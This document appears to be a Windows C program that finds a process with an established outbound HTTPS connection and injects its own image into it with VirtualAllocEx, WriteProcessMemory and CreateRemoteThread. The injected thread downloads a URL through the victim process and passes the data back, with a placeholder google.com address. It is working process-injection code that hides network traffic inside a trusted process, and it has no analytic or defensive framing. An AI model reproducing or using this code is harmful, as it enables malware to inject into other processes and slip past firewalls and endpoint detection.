#include <Windows.h>
#include <TlHelp32.h>
#include <iphlpapi.h> // MIB_TCPTABLE_OWNER_PID, GetExtendedTcpTable...
#include <wininet.h> // INTERNET_OPEN_TYPE_DIRECT...
#include <stdio.h>

#pragma comment(lib, "iphlpapi.lib")

#define __STRINGIZE(x) #x
#define _STRINGIZE(x) __STRINGIZE(x)

#define WININET_DLL_NAME "wininet.dll"

#define URL_MAX_SIZE 1024

#define DEBUG 1

#if (defined(DEBUG) && DEBUG == 1) || defined(_DEBUG)
#define LOG(s, ...) printf("Function " __FUNCTION__ " on line %d log message: '" s "'\n", __LINE__, __VA_ARGS__)
#else
#define LOG(s, ...) ((void)NULL)
#endif

typedef struct _BLACKLIST_PROC
{
	DWORD* lpdwTable;
	DWORD dwCount;
} BLACKLIST_PROC;

typedef struct _CALLBACK_IN
{
	USHORT nPort;
	DWORD dwExecutorProcessId;
	DWORD_PTR dwCallbackOutAddr;
	TCHAR tszWininetDllName[sizeof(WININET_DLL_NAME)];
	TCHAR tszUrl[URL_MAX_SIZE];
} CALLBACK_IN, * LPCALLBACK_IN;

typedef struct _CALLBACK_OUT
{
	DWORD dwDataSize;
	DWORD_PTR dwDataAddr;
} CALLBACK_OUT, * LPCALLBACK_OUT;

typedef enum _CALLBACK_CODE {
	CC_UNDEFINED,

	CC_OK,
	CC_INVALID_PARAMS,
	CC_LOADLIB_ERR,
	CC_GETPROC_ERR,
	CC_NETOPEN_ERR,
	CC_URLCRACK_ERR,
	CC_NETCONN_ERR,
	CC_OPENREQ_ERR,
	CC_SENDREQ_ERR,
	CC_DOWNLOAD_0_ERR,
	CC_DOWNLOAD_1_ERR,
	CC_OPEN_EXECUTOR_ERR,
	CC_MEMALLOC_ERR,

	CC_MAXCODE
} CALLBACK_CODE;

static LPVOID MemAlloc(DWORD dwSize)
{
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

static LPVOID MemRealloc(LPVOID lpAddr, DWORD dwSize)
{
	if (lpAddr == NULL) {
		return MemAlloc(dwSize);
	}
	else {
		return HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpAddr, dwSize);
	}
}

static BOOL MemFree(LPVOID lpAddr)
{
	return HeapFree(GetProcessHeap(), 0, lpAddr);
}

static LPVOID MemCopy(LPVOID lpDst, LPVOID lpSrc, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++) {
		*((BYTE*)((DWORD_PTR)lpDst + i)) = *((BYTE*)((DWORD_PTR)lpSrc + i));
	}

	return lpDst;
}

static LPVOID MemSet(LPVOID lpAddr, BYTE bValue, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++) {
		*((BYTE*)((DWORD_PTR)lpAddr + i)) = bValue;
	}

	return lpAddr;
}

BOOL GetProcessNameById(DWORD dwProcessId, LPTSTR lpBuffer, DWORD dwBufferSize)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // all processes

	if (!hSnap || hSnap == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	PROCESSENTRY32 Entry = { 0 };
	Entry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnap, &Entry)) { // start with the first in snapshot
		do {
			if (Entry.th32ProcessID == dwProcessId) {
				memset(lpBuffer, 0, dwBufferSize);
				lstrcpy(lpBuffer, Entry.szExeFile);
				break;
			}
		} while (Process32Next(hSnap, &Entry)); // keep going until end of snapshot
	}

	CloseHandle(hSnap);

	return TRUE;
}

DWORD FindTargetProcessId(USHORT nRemotePort, BLACKLIST_PROC* lpBlacklistProc)
{
	PMIB_TCPTABLE_OWNER_PID lpPidTable = NULL;

	DWORD dwPidTableSize = sizeof(MIB_TCPTABLE_OWNER_PID);
	DWORD dwTcpTableRet = 0;

	do {
		LPBYTE lpbReallocatedBuffer = MemRealloc(lpPidTable, dwPidTableSize);

		if (lpbReallocatedBuffer == NULL) {
			if (lpPidTable != NULL) {
				MemFree(lpPidTable);
			}

			return 0;
		}
		else {
			lpPidTable = lpbReallocatedBuffer;
		}

		dwTcpTableRet = GetExtendedTcpTable(lpPidTable, &dwPidTableSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);

	} while (dwTcpTableRet == ERROR_INSUFFICIENT_BUFFER);

	if (lpPidTable == NULL) {
		return 0;
	}

	DWORD dwTargetProcessId = 0;

	for (DWORD i = 0; i < lpPidTable->dwNumEntries; i++) {

		BOOL bIsBlacklisted = FALSE;

		for (DWORD j = 0; j < lpBlacklistProc->dwCount; j++) {
			if (lpBlacklistProc->lpdwTable[j] == lpPidTable->table[i].dwOwningPid) {
				bIsBlacklisted = TRUE;
				break;
			}
		}

		if (bIsBlacklisted) {
			continue;
		}

		if (lpPidTable->table[i].dwOwningPid <= 4) {
			continue;
		}

		if (lpPidTable->table[i].dwState != MIB_TCP_STATE_ESTAB) {
			continue;
		}

		if (!lpPidTable->table[i].dwRemotePort || _byteswap_ushort(lpPidTable->table[i].dwRemotePort) != nRemotePort) {
			continue;
		}

		if (!lpPidTable->table[i].dwRemoteAddr || lpPidTable->table[i].dwRemoteAddr == 0x100007F) {
			continue;
		}
//#ifdef _M_IX86
		HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE32, lpPidTable->table[i].dwOwningPid);
		if (hModuleSnap == INVALID_HANDLE_VALUE && GetLastError() == ERROR_PARTIAL_COPY) { // if x64
			continue;
		}
		else {
			CloseHandle(hModuleSnap);
		}
//#endif
		dwTargetProcessId = lpPidTable->table[i].dwOwningPid;
		break;
	}

	MemFree(lpPidTable);

	return dwTargetProcessId;
}

BOOL VirtualExecuteEx(HANDLE hProcess, LPTHREAD_START_ROUTINE lpFunction, LPDWORD lpdwExitCode, LPVOID lpParameters, DWORD dwParametersSize)
{
	*lpdwExitCode = 0;

	if (lpParameters != NULL && !dwParametersSize) {
		return FALSE;
	}

	LPVOID lpImageBase = GetModuleHandleA(NULL);

	IMAGE_NT_HEADERS* lpNtHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)lpImageBase + ((IMAGE_DOS_HEADER*)lpImageBase)->e_lfanew);

	LPVOID lpTargetImage;
	if ((lpTargetImage = VirtualAllocEx(hProcess, NULL, lpNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		LOG("Unable to allocate memory for shellcode (0x%x)", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, lpTargetImage, lpImageBase, lpNtHeaders->OptionalHeader.SizeOfImage, NULL)) {
		LOG("Unable to write shellcode (0x%x)", GetLastError());
		VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
		return FALSE;
	}

	LPVOID lpRemoteParameters = NULL;

	if (lpParameters) {
		lpRemoteParameters = VirtualAllocEx(hProcess, NULL, dwParametersSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (lpRemoteParameters != NULL) {
			if (!WriteProcessMemory(hProcess, lpRemoteParameters, lpParameters, dwParametersSize, NULL)) {
				LOG("Unable to write callback paramerets (0x%x)", GetLastError());
				VirtualFreeEx(hProcess, lpRemoteParameters, 0, MEM_RELEASE);
				VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
				return FALSE;
			}
		}
		else {
			LOG("Unable to allocate memory for parameters (0x%x)", GetLastError());
			VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
			return FALSE;
		}
	}

	DWORD_PTR dwDeltaImageBase = (DWORD_PTR)lpTargetImage - (DWORD_PTR)lpImageBase;

	HANDLE hThread;
	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)lpFunction + dwDeltaImageBase), lpRemoteParameters, 0, NULL)) == NULL) {
		LOG("Unable to create remote thread (0x%x)", GetLastError());
		if (lpRemoteParameters) {
			VirtualFreeEx(hProcess, lpRemoteParameters, 0, MEM_RELEASE);
		}
		VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	GetExitCodeThread(hThread, lpdwExitCode);
	CloseHandle(hThread);

	if (lpRemoteParameters) {
		VirtualFreeEx(hProcess, lpRemoteParameters, 0, MEM_RELEASE);
	}

	VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);

	return TRUE;
}

DWORD WINAPI DownloadCallback(LPVOID lpThreadParameter)
{
	if (lpThreadParameter == NULL) {
		return CC_INVALID_PARAMS;
	}

	LPCALLBACK_IN lpInParams = lpThreadParameter;

	if (!lpInParams->dwCallbackOutAddr || !lpInParams->dwExecutorProcessId || !lpInParams->nPort || !lstrlen(lpInParams->tszUrl)) {
		return CC_INVALID_PARAMS;
	}

	HMODULE hWininet = LoadLibrary(lpInParams->tszWininetDllName);
	if (hWininet == NULL) {
		return CC_LOADLIB_ERR;
	}

	MemSet(lpInParams->tszWininetDllName, 0, sizeof(lpInParams->tszWininetDllName));

	FARPROC fnInternetOpen = GetProcAddress(hWininet, _STRINGIZE(InternetOpen));
	FARPROC fnInternetCloseHandle = GetProcAddress(hWininet, _STRINGIZE(InternetCloseHandle));
	FARPROC fnInternetCrackUrl = GetProcAddress(hWininet, _STRINGIZE(InternetCrackUrl));
	FARPROC fnInternetConnect = GetProcAddress(hWininet, _STRINGIZE(InternetConnect));
	FARPROC fnHttpOpenRequest = GetProcAddress(hWininet, _STRINGIZE(HttpOpenRequest));
	FARPROC fnHttpSendRequest = GetProcAddress(hWininet, _STRINGIZE(HttpSendRequest));
	FARPROC fnHttpQueryInfo = GetProcAddress(hWininet, _STRINGIZE(HttpQueryInfo));
	FARPROC fnInternetReadFile = GetProcAddress(hWininet, _STRINGIZE(InternetReadFile));

	if (fnInternetOpen == NULL || fnInternetCloseHandle == NULL || fnInternetCrackUrl == NULL ||
		fnInternetConnect == NULL || fnHttpOpenRequest == NULL || fnHttpSendRequest == NULL ||
		fnHttpQueryInfo == NULL || fnInternetReadFile == NULL
		) {
		FreeLibrary(hWininet);
		return CC_GETPROC_ERR;
	}

	HINTERNET hNet;
	if ((hNet = fnInternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL)) == NULL) {
		FreeLibrary(hWininet);
		return CC_NETOPEN_ERR;
	}

	URL_COMPONENTS* lpUrlComponents = MemAlloc(sizeof(URL_COMPONENTS));
	if (lpUrlComponents == NULL) {
		FreeLibrary(hWininet);
		return CC_MEMALLOC_ERR;
	}
	lpUrlComponents->dwStructSize = sizeof(URL_COMPONENTS);

	lpUrlComponents->lpszHostName = MemAlloc(INTERNET_MAX_HOST_NAME_LENGTH * sizeof(TCHAR));
	if (lpUrlComponents->lpszHostName == NULL) {
		MemFree(lpUrlComponents);
		FreeLibrary(hWininet);
		return CC_MEMALLOC_ERR;
	}
	lpUrlComponents->dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH * sizeof(TCHAR);

	lpUrlComponents->lpszUrlPath = MemAlloc(INTERNET_MAX_PATH_LENGTH * sizeof(TCHAR));
	if (lpUrlComponents->lpszUrlPath == NULL) {
		MemFree(lpUrlComponents);
		MemFree(lpUrlComponents->lpszHostName);
		FreeLibrary(hWininet);
		return CC_MEMALLOC_ERR;
	}
	lpUrlComponents->dwUrlPathLength = INTERNET_MAX_PATH_LENGTH * sizeof(TCHAR);

	if (!(BOOL)fnInternetCrackUrl(lpInParams->tszUrl, lstrlen(lpInParams->tszUrl), ICU_DECODE | ICU_ESCAPE, lpUrlComponents)) {
		MemFree(lpUrlComponents->lpszUrlPath);
		MemFree(lpUrlComponents->lpszHostName);
		MemFree(lpUrlComponents);
		FreeLibrary(hWininet);
		return CC_URLCRACK_ERR;
	}

	MemSet(lpInParams->tszUrl, 0, sizeof(lpInParams->tszUrl));

	DWORD dwRetCode = CC_OK;

	TCHAR* lpDownloadBuffer = NULL;
	DWORD dwDownloadSize = 0;

	DWORD dwSecure = 0;
	if (lpInParams->nPort == INTERNET_DEFAULT_HTTPS_PORT)
		dwSecure = INTERNET_FLAG_SECURE;

	HINTERNET hCon;
	if ((hCon = fnInternetConnect(hNet, lpUrlComponents->lpszHostName, lpInParams->nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)) != NULL) {
		HINTERNET hRequest;
		if ((hRequest = fnHttpOpenRequest(hCon, NULL, lpUrlComponents->lpszUrlPath, NULL, NULL, NULL, INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RESYNCHRONIZE | dwSecure, 0)) != NULL) {
			if (fnHttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
				DWORD dwTypeSize = sizeof(DWORD);
				DWORD dwContentSize = 0;
				LPDWORD dwIndex = NULL;

				if (fnHttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &dwContentSize, &dwTypeSize, dwIndex) && dwContentSize != 0)
				{
					lpDownloadBuffer = MemAlloc(dwContentSize * sizeof(TCHAR));
					if (lpDownloadBuffer == NULL) {
						dwRetCode = CC_MEMALLOC_ERR;
					}
					else {
						DWORD dwContentRead = 0;
						if (fnInternetReadFile(hRequest, lpDownloadBuffer, dwContentSize, &dwContentRead)) {
							dwDownloadSize = dwContentSize;
						}
						else {
							MemFree(lpDownloadBuffer);
							dwRetCode = CC_DOWNLOAD_0_ERR;
						}
					}
				}
				else
				{
					DWORD dwContentStepPage = 0x1000;
					LPBYTE lpbContentBuffer = MemAlloc(dwContentStepPage);
					if (lpbContentBuffer == NULL) {
						dwRetCode = CC_MEMALLOC_ERR;
					}
					else {

						DWORD dwBufferSize = dwContentStepPage;
						DWORD_PTR dwBufferOffset = 0;
						BOOL bReaded = FALSE;

						do
						{
							DWORD dwReadSize = 0;
							if (fnInternetReadFile(hRequest, (DWORD_PTR)lpbContentBuffer + dwBufferOffset, dwContentStepPage, &dwReadSize)) {
								if (dwReadSize) {
									dwBufferSize += dwReadSize;
									dwBufferOffset += dwReadSize;

									LPBYTE lpbReallocatedBuffer = NULL;
									if ((lpbReallocatedBuffer = MemRealloc(lpbContentBuffer, dwBufferSize)) != NULL) {
										lpbContentBuffer = lpbReallocatedBuffer;
									}
									else {
										MemFree(lpbContentBuffer);
										dwBufferSize = 0;
										dwBufferOffset = 0;
										break;
									}
								}
								else {
									bReaded = TRUE;
								}
							}
						} while (!bReaded);

						LPBYTE lpbNewBuffer = NULL;
						if (bReaded && lpbContentBuffer) {
							lpbNewBuffer = MemAlloc(dwBufferOffset);
							MemCopy(lpbNewBuffer, lpbContentBuffer, dwBufferOffset);
						}
						else {
							dwRetCode = CC_DOWNLOAD_1_ERR;
						}

						MemFree(lpbContentBuffer);

						lpDownloadBuffer = lpbNewBuffer;
						dwDownloadSize = dwBufferOffset;
					}
				}
			}
			else {
				dwRetCode = CC_SENDREQ_ERR;
			}

			fnInternetCloseHandle(hRequest);
		}
		else {
			dwRetCode = CC_OPENREQ_ERR;
		}

		fnInternetCloseHandle(hCon);
	}
	else {
		dwRetCode = CC_NETCONN_ERR;
	}

	fnInternetCloseHandle(hNet);

	FreeLibrary(hWininet);

	MemFree(lpUrlComponents->lpszUrlPath);
	MemFree(lpUrlComponents->lpszHostName);
	MemFree(lpUrlComponents);

	if (dwRetCode != CC_OK) {
		return dwRetCode;
	}

	HANDLE hExecutorProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, lpInParams->dwExecutorProcessId);
	if (hExecutorProcess == NULL) {
		MemFree(lpDownloadBuffer);
		return CC_OPEN_EXECUTOR_ERR; // maybe the executor is running as an administrator, but the target process is not
	}

	LPCALLBACK_OUT lpCallbackOut = MemAlloc(sizeof(CALLBACK_OUT));
	if (lpCallbackOut == NULL) {
		MemFree(lpDownloadBuffer);
		CloseHandle(hExecutorProcess);
		return CC_MEMALLOC_ERR;
	}

	lpCallbackOut->dwDataAddr = VirtualAllocEx(hExecutorProcess, NULL, dwDownloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	lpCallbackOut->dwDataSize = dwDownloadSize;

	WriteProcessMemory(hExecutorProcess, lpCallbackOut->dwDataAddr, lpDownloadBuffer, dwDownloadSize, NULL);

	MemFree(lpDownloadBuffer);

	WriteProcessMemory(hExecutorProcess, lpInParams->dwCallbackOutAddr, lpCallbackOut, sizeof(CALLBACK_OUT), NULL);

	MemFree(lpCallbackOut);

	CloseHandle(hExecutorProcess);

	return CC_OK;
}

VOID CreateCallbackParameters(LPCALLBACK_IN lpCallbackIn, LPCTSTR tszUrl, USHORT nPort)
{
	lpCallbackIn->nPort = nPort;

	MemCopy(lpCallbackIn->tszUrl, tszUrl, lstrlen(tszUrl) * sizeof(TCHAR));
	MemCopy(lpCallbackIn->tszWininetDllName, TEXT(WININET_DLL_NAME), sizeof(WININET_DLL_NAME) * sizeof(TCHAR));

	lpCallbackIn->dwExecutorProcessId = GetCurrentProcessId();
	lpCallbackIn->dwCallbackOutAddr = VirtualAlloc(NULL, sizeof(CALLBACK_OUT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

VOID DestroyCallbackParameters(LPCALLBACK_IN lpCallbackIn)
{
	VirtualFree(lpCallbackIn->dwCallbackOutAddr, 0, MEM_RELEASE);
}

VOID AddProcessToBlacklist(BLACKLIST_PROC* lpBlacklist, DWORD dwProcessId)
{
	lpBlacklist->lpdwTable = MemRealloc(lpBlacklist->lpdwTable, (lpBlacklist->dwCount + 1) * sizeof(DWORD));
	lpBlacklist->lpdwTable[lpBlacklist->dwCount] = dwProcessId;
	lpBlacklist->dwCount += 1;
}

int main()
{
	const TCHAR tszUrl[] = TEXT("https://google.com");
	const USHORT nPort = INTERNET_DEFAULT_HTTPS_PORT;

	BLACKLIST_PROC BlacklistProc = { 0 };

	BOOL bDownloaded = FALSE;

	do {
		DWORD dwTargetProcessId;
		if ((dwTargetProcessId = FindTargetProcessId(nPort, &BlacklistProc)) == 0) {
			continue;
		}

		TCHAR szProcessName[MAX_PATH] = { 0 };
		GetProcessNameById(dwTargetProcessId, szProcessName, MAX_PATH * sizeof(TCHAR));

		printf(
			"%s"
			"Process finded!\n"
			"Process id: %d\n"
			"Process name: %s\n", 
			(BlacklistProc.dwCount > 0 ? "\n" : ""),
			dwTargetProcessId,
			szProcessName
		);

		HANDLE hTargetProcess;
		if ((hTargetProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, dwTargetProcessId)) == NULL) {
			printf("Unable to open\n");
			AddProcessToBlacklist(&BlacklistProc, dwTargetProcessId);
			continue;
		}

		CALLBACK_IN InParams = { 0 };
		CreateCallbackParameters(&InParams, tszUrl, nPort);

		printf("Connection URL: %s:%d\n", InParams.tszUrl, InParams.nPort);

		DWORD dwExitCode = 0;
		if (VirtualExecuteEx(hTargetProcess, DownloadCallback, &dwExitCode, &InParams, sizeof(CALLBACK_IN))) {
			LPCALLBACK_OUT lpOutParams = InParams.dwCallbackOutAddr;

			if (dwExitCode == CC_OK) {
				LPBYTE lpbData = (LPBYTE)(LPVOID)lpOutParams->dwDataAddr;
				DWORD dwDataSize = lpOutParams->dwDataSize;

				printf(
					"Successfully downloaded!\n"
					"Download data size: %d bytes\n"
					"Download data: %s\n", 
					dwDataSize, 
					(CHAR*)lpbData
				);

				VirtualFree(lpbData, 0, MEM_RELEASE);

				bDownloaded = TRUE;
			}
			else {
				if (dwExitCode >= CC_MAXCODE) {
					printf("Callback closed with internal error\n");
				}
				else {
					printf("Callback returned the error code: %lu\n", dwExitCode);
				}

				AddProcessToBlacklist(&BlacklistProc, dwTargetProcessId);
			}
		}
		else {
			printf("Unable to execute callback\n");

			AddProcessToBlacklist(&BlacklistProc, dwTargetProcessId);
		}

		DestroyCallbackParameters(&InParams);

		CloseHandle(hTargetProcess);

	} while (!bDownloaded);

	return 0;
}